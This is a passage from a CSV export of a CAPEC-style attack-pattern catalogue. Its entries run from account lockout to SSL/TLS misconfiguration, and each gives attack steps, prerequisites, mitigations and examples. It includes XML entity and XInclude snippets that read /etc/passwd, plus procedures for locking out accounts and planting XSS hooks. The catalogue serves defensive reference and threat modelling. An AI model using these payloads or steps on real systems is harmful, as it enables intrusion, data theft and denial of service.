potentially cause account lockout:TECHNIQUE:Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly:TECHNIQUE:Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out.::STEP:2:PHASE:Experiment:DESCRIPTION:[Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out:TECHNIQUE:Obtain list of authorized users using another attack pattern, such as SQL Injection.:TECHNIQUE:Attempt to create accounts if possible; system should indicate if a user ID is already taken.:TECHNIQUE:Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.::STEP:3:PHASE:Exploit:DESCRIPTION:[Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.:TECHNIQUE:For each user ID to be locked out, perform the lockout procedure discovered in the first step.::\",\"::The system has a lockout mechanism.::An attacker must be able to reproduce behavior that would result in an account being locked.::\",\"::SKILL:No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above.:LEVEL:Low::\",\"::Computer with access to the login portion of the target system::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Implement intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.::When implementing security features, consider how they can be misused and made to turn on themselves.::\",\"::A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.::\",\"::645::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1531:ENTRY NAME:Account Access Removal::\",\"\",\n20,\"Encryption Brute Forcing\",Standard,Draft,\"An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:112::NATURE:CanPrecede:CAPEC ID:668::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:Determine the ciphertext and the encryption algorithm.::STEP:2:PHASE:Experiment:DESCRIPTION:Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense.::\",\"::Ciphertext is known.::Encryption algorithm and key size are known.::\",\"::SKILL:Brute forcing encryption does not require much skill.:LEVEL:Low::\",\"::A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge). On average, for a binary key of size N, 2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext. Obviously as N gets large the brute force approach becomes infeasible.::\",\"::None. This attack happens offline.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.::In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.::\",\"::In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.::\",\"::326::327::693::1204::\",\"\",\"\",\n200,\"Removal of filters: Input filters, output filters, data masking\",Detailed,Draft,\"An attacker removes or disables filtering mechanisms on the target application. Input filters prevent invalid data from being sent to an application (for example, overly large inputs that might cause a buffer overflow or other malformed inputs that may not be correctly handled by an application). Input filters might also be designed to constrained executable content.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:207::\",\"\",\"::The target application must utilize some sort of filtering mechanism (input, output, or data masking).::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n201,\"Serialized Data External Linking\",Detailed,Draft,\"An adversary creates a serialized data file (e.g. XML, YAML, etc...) that contains an external data reference. Because serialized data parsers may not validate documents with external references, there may be no checks on the nature of the reference in the external data. This can allow an adversary to open arbitrary files or connections, which may further lead to the adversary gaining access to information on the system that they would normally be unable to obtain.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:122::NATURE:ChildOf:CAPEC ID:278::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an adversary records all instances of web services that process requests with serialized data.:TECHNIQUE:Use an automated tool to record all instances of URLs that process requests with serialized data.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes serialized data requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Craft malicious payload] The adversary crafts malicious data message that contains references to sensitive files.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch an External Linking attack] Send the malicious crafted message containing the reference to a sensitive file to the target URL.::\",\"::The target must follow external data references without validating the validity of the reference target.::\",\"::SKILL:To send serialized data messages with maliciously crafted schema.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Configure the serialized data processor to only retrieve external entities from trusted sources.::\",\"::The following DTD would attempt to open the /dev/tty device: <!DOCTYPE doc [ <!ENTITY ent SYSTEM file:///dev/tty> ]> A malicious actor could use this crafted DTD to reveal sensitive information.::The following XML snippet would attempt to open the /etc/passwd file: <foo xmlns:xi=http://www.w3.org/2001/XInclude> <xi:include parse=text href=file:///etc/passwd/></foo>::\",\"::829::\",\"\",\"\",\n202,\"Create Malicious Client\",Standard,Draft,\"An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:22::\",\"\",\"::The targeted service must make assumptions about the behavior of the client application that interacts with it, which can be abused by an adversary.::\",\"\",\"::The adversary must be able to reverse engineer a client of the targeted service. However, the adversary does not need to reverse engineer all client functionality - they only need to recreate enough of the functionality to access the desired server functionality.::\",\"\",\"\",\"\",\"\",\"::602::\",\"\",\"\",\n203,\"Manipulate Registry Information\",Standard,Stable,\"An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:176::\",\"\",\"::The targeted application must rely on values stored in a registry.::The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.::\",\"::SKILL:The adversary requires privileged credentials or the development/acquiring of a tailored remote access tool.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"::Ensure proper permissions are set for Registry hives to prevent users from modifying keys.::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking using an allowlist of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::\",\"::Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).::\",\"::15::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1112:ENTRY NAME:Modify Registry::::TAXONOMY NAME:ATTACK:ENTRY ID:1647:ENTRY NAME:Plist Modification::\",\"\",\n204,\"Lifting Sensitive Data Embedded in Cache\",Detailed,Draft,\"An adversary examines a target application's cache, or a browser cache, for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:167::NATURE:CanPrecede:CAPEC ID:560::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Application Cache] An adversary first identifies an application that utilizes a cache. This could either be a web application storing data in a browser cache, or an application running on a separate machine. The adversary examines the cache to determine file permissions and possible encryption.:TECHNIQUE:Use probing tools to look for application cache files on a machine.:TECHNIQUE:Use a web application and determine if any sensitive information is stored in browser cache.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to Access Cache] Once the cache has been discovered, the adversary attempts to access the cached data. This often requires previous access to a machine hosting the target application.:TECHNIQUE:Use priviledge escalation to access cache files that might have strict privileges.:TECHNIQUE:If the application cache is encrypted with weak encryption, attempt to understand the encryption technique and break the encryption.::STEP:3:PHASE:Exploit:DESCRIPTION:[Lift Sensitive Data from Cache] After gaining access to cached data, an adversary looks for potentially sensitive information and stores it for malicious use. This sensitive data could possibly be used in follow-up attacks related to authentication or authorization.:TECHNIQUE:Using a public computer, or gaining access to a victim's computer, examine browser cache to look for sensitive data left over from previous sessions.::\",\"::The target application must store sensitive information in a cache.::The cache must be inadequately protected against attacker access.::\",\"\",\"::The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.::\",\"\",\"\",\"\",\"\",\"::524::311::1239::1258::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::\",\"\",\n206,\"Signing Malicious Code\",Detailed,Draft,\"The adversary extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the adversary has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the adversary to execute arbitrary code on the victim's computer. This differs from CAPEC-673, because the adversary is performing the code signing.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary first attempts to obtain a digital certificate in order to sign their malware or tools. This certificate could be stolen, created by the adversary, or acquired normally through a certificate authority.::STEP:2:PHASE:Explore:DESCRIPTION:Based on the type of certificate obtained, the adversary will create a goal for their attack. This is either a broad or targeted attack. If an adversary was able to steal a certificate from a targeted organization, they could target this organization by pretending to have legitimate code signed by them. In other cases, the adversary would simply sign their malware and pose as legitimate software such that any user might trust it. This is the more broad approach::STEP:3:PHASE:Experiment:DESCRIPTION:The adversary creates their malware and signs it with the obtained digital certificate. The adversary then checks if the code that they signed is valid either through downloading from the targeted source or testing locally.::STEP:4:PHASE:Exploit:DESCRIPTION:Once the malware has been signed, it is then deployed to the desired location. They wait for a trusting user to run their malware, thinking that it is legitimate software. This malware could do a variety of things based on the motivation of the adversary.::\",\"::The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the adversary does not need to steal the signing key before forging code bundles in the developer's name.)::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"::Ensure digital certificates are protected and inaccessible by unauthorized uses.::If a digital certificate has been compromised it should be revoked and regenerated.::Even if a piece of software has a valid and trusted digital signature, it should be assessed for any weaknesses and vulnerabilities.::\",\"::In the famous Stuxnet malware incident, two digital certificates were compromised in order to sign malicious device drivers with legitimate credentials. The signing resulted in the malware appearing as trusted by the system it was running on, which facilitated the installation of the malware in kernel mode. This further resulted in Stuxnet remaining undetected for a significant amount of time. [REF-699]::The cyber espionage group CyberKittens leveraged a stolen certificate from AI Squared that allowed them to leverage a signed executable within Operation Wilted Tulip. This ultimately allowed the executable to run as trusted on the system, allowing a Crowd Strike stager to be loaded within the system's memory. [REF-714]::\",\"::732::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls:Code Signing::\",\"\",\n207,\"Removing Important Client Functionality\",Standard,Draft,\"An adversary removes or disables functionality on the client that the server assumes to be present and trustworthy.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:22::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The adversary probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.:TECHNIQUE:The adversary probes by exploring an application's functionality and its underlying mapping to server-side components.:TECHNIQUE:The adversary reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine which functionality to disable or remove] The adversary tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.:TECHNIQUE:The adversary reverse engineers the client-side code to determine which functionality to disable or remove.::STEP:3:PHASE:Exploit:DESCRIPTION:[Disable or remove the critical functionality from the client code] Once the functionality has been determined, the adversary disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.:TECHNIQUE:The adversary disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server.::\",\"::The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client.::\",\"::SKILL:To reverse engineer the client-side code to disable/remove the functionality on the client that the server relies on.:LEVEL:High::SKILL:The adversary installs a web tool that allows scripts or the DOM model of web-based applications to be modified before they are executed in a browser. GreaseMonkey and Firebug are two examples of such tools.:LEVEL:Low::\",\"::The adversary must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.::Design: Ship client-side application with integrity checks (code signing) when possible.::Design: Use obfuscation and other techniques to prevent reverse engineering the client code.::\",\"::The adversary reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the adversary simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.::The adversary uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the adversary directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).::\",\"::602::\",\"\",\"\",\n208,\"Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements\",Detailed,Draft,\"An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:207::\",\"\",\"::The targeted server must rely on the client to correctly perform monetary calculations and must fail to detect errors in these calculations.::\",\"\",\"::The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this.::\",\"\",\"\",\"\",\"\",\"::602::\",\"\",\"\",\n209,\"XSS Using MIME Type Mismatch\",Detailed,Draft,\"An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:592::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all areas that allow a user to upload content through an HTTP POST request. This is typically found in blogs or forums.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to file upload features:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for MIME type mismatch] The adversary uses the entry points gathered in the Explore phase as a target list and uploads files with scripting content, but whose MIME type is specified as a file type that cannot execute scripting content. If the application only checks the MIME type of the file, it may let the file through, causing the script to be executed by any user who accesses the file.:TECHNIQUE:Upload a script file with a MIME type of text/plain to a forum and then access the uploaded file to see if the script is executed. If possible, the script displays a unique identifier so the adversary knows for certain it was executed when testing.::STEP:3:PHASE:Experiment:DESCRIPTION:[Store malicious XSS content] Once the adversary has determined which file upload locations are vulnerable to MIME type mismatch, they will upload a malicious script disguised as a non scripting file. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.:TECHNIQUE:Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.:TECHNIQUE:Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.:TECHNIQUE:Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.::\",\"::The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.::The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.::\",\"\",\"::The adversary must have the ability to source the file of the incorrect MIME type containing a script.::\",\"\",\"\",\"\",\"::For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.::In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.::\",\"::79::20::646::\",\"\",\"\",\n21,\"Exploitation of Trusted Identifiers\",Meta,Stable,\"An adversary guesses, obtains, or rides a trusted identifier (e.g. session ID, resource ID, cookie, etc.) to perform authorized actions under the guise of an authenticated user or service.\",\"\",High,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target, the adversary probes for cookies, session tokens, or entry points that bypass identifiers altogether.:TECHNIQUE:Spider all available pages:TECHNIQUE:Attack known bad interfaces:TECHNIQUE:Search outward-facing configuration and properties files for identifiers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Fetch samples] The adversary fetches many samples of identifiers. This may be through legitimate access (logging in, legitimate connections, etc.) or via systematic probing.:TECHNIQUE:An adversary makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An adversary makes authorized connections and records the session tokens or credentials issued.:TECHNIQUE:An adversary gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connection from it, attempting to gain the same privileges as a trusted system.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::\",\"::Server software must rely on weak identifier proof and/or verification schemes.::Identifiers must have long lifetimes and potential for reusability.::Server software must allow concurrent sessions to exist.::\",\"::SKILL:To achieve a direct connection with the weak or non-existent server session access control, and pose as an authorized user:LEVEL:Low::\",\"::Ability to deploy software on network.::Ability to communicate synchronously or asynchronously with server.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.::Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.::Implementation: If the identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.::Implementation: If the web or application server supports it, then encrypting and/or signing the identifier (such as cookie) can protect the ID if intercepted.::Design: Use strong session identifiers that are protected in transit and at rest.::Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.::Implementation: Verify authenticity of all identifiers at runtime.::\",\"::Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an adversary to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an adversary to exploit session IDs. A brute force attack involves an adversary repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an adversary can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The adversary can then use these variables and access the application.::For example, in a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or the process that wrote the message to the queue is authentic and authorized to do so.::\",\"::290::302::346::539::6::384::664::602::642::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134:ENTRY NAME:Access Token Manipulation::::TAXONOMY NAME:ATTACK:ENTRY ID:1528:ENTRY NAME:Steal Application Access Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1539:ENTRY NAME:Steal Web Session Cookie::\",\"\",\n212,\"Functionality Misuse\",Meta,Stable,\"An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.\",\"\",Medium,Medium,\"\",\"\",\"::The adversary has the capability to interact with the application directly.The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.::\",\"::SKILL:General computer knowledge about how applications are launched, how they interact with input/output, and how they are configured.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Gain Privileges:NOTE:A successful attack of this kind can compromise the confidentiality of an authorized user's credentials.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Depending on the adversary's intended technical impact, a successful attack of this kind can compromise any or all elements of the security triad.::\",\"::Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.::When implementing security features, consider how they can be misused and compromised.::\",\"\",\"::1242::1246::1281::\",\"\",\"\",\n215,\"Fuzzing for application mapping\",Detailed,Draft,\"An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:54::NATURE:ChildOf:CAPEC ID:28::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.:TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.:TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that might provide information to map the application::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] An adversary usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the adversary may try changing the origin IP addresses or client browser identification strings or start a new session from where they left off in obfuscating the attack.:TECHNIQUE:Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.:TECHNIQUE:If the application rejects the large amount of fuzzing messages from the same host machine, the adversary needs to hide the attacks by changing the IP addresses or other credentials.::\",\"::The target application must fail to sanitize incoming messages adequately before processing.::\",\"::SKILL:Although fuzzing parameters is not difficult, and often possible with automated fuzzing tools, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.:LEVEL:Medium::\",\"::Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::\",\"::Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.::Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.::Implementation: Obfuscate server fields of HTTP response.::Implementation: Hide inner ordering of HTTP response header.::Implementation: Customizing HTTP error codes such as 404 or 500.::Implementation: Hide HTTP response header software information filed.::Implementation: Hide cookie's software information filed.::Implementation: Obfuscate database type in Database API's error message.::\",\"::The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.::In languages that utilize stack traces, revealing them can give adversaries information that allows them to map functions and file locations for an application. The following Java method prints out a stack trace that exposes the application to this attack pattern. public void httpGet(HttpServletRequest request, HttpServletResponse response) {try {processRequest();} catch (Exception ex) {ex.printStackTrace(response.getWriter()); return;}} If this code is running on a server, such as a web application, then the adversary could cause the exception to be printed through fuzzing.::\",\"::209::532::\",\"\",\"\",\n216,\"Communication Channel Manipulation\",Meta,Stable,\"An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.\",\"\",,,\"::NATURE:CanPrecede:CAPEC ID:94::\",\"\",\"::The target application must leverage an open communications channel.::The channel on which the target communicates must be vulnerable to interception (e.g., adversary in the middle attack - CAPEC-94).::\",\"\",\"::A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Other:NOTE:The adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel.::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:A successful Communication Channel Manipulation attack can result in sensitive information exposure to the adversary, thereby compromising the communication channel's confidentiality.::\",\"::Encrypt all sensitive communications using properly-configured cryptography.::Design the communication system such that it associates proper authentication/authorization with each channel/message.::\",\"\",\"::306::\",\"\",\"\",\n217,\"Exploiting Incorrectly Configured SSL/TLS\",Standard,Draft,\"An adversary takes advantage of incorrectly configured SSL/TLS communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.\",\"\",Low,,\"::NATURE:ChildOf:CAPEC ID:216::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine SSL/TLS Configuration] Determine the SSL/TLS configuration of either the server or client being targeted, preferably both. This is not a hard requirement, as the adversary can simply assume commonly exploitable configuration settings and indiscriminately attempt them.:TECHNIQUE:If the target is a webpage, some of the SSL/TLS configuration can be viewed through the browser's security information, such as the key sizes and cipher being 